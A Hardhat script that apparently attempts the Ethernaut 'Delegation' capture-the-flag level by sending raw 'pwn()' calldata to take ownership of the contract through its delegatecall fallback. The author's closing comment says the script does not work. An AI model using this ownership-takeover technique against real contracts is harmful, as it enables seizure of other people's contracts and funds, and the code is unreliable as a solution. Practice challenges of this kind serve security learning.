
import { ethers } from "hardhat";

async function main() {
    const [account] = await ethers.getSigners();

    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = Delegation.attach("0x8258478DBbd5f38Ad69609BC60701ae664826197");


    const iface = new ethers.utils.Interface([
        "constructor(address _owner) public",
        "function pwn() public"
    ]);

    let data = iface.encodeFunctionData("pwn", []);
    data += "00000000000000000000000000000000000000000000000000000000"

    let tx = await account.sendTransaction({
        to: delegation.address,
        data: data
    });
    await tx.wait();


    console.log(account.address);
    console.log(await delegation.owner());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });

    // This should work, truly no idea why it doesn't
    // Should be the same as what's happening here: https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4

